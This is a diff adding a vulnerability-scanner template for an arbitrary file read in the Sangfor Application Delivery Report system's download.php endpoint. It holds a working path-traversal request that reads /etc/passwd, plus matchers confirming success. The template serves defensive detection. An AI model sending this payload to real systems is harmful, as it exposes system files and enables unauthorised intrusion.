@@ -1,0 +1,24 @@
+id: sangfor-ad-readfile
+
+info:
+  name: Sangfor Application Delivery Report Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file read vulnerability in Sangfor Application Delivery Report system via the download.php endpoint.
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/report/download.php?pdf=../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(root|toor):[x*]:0:0:"
+        part: body
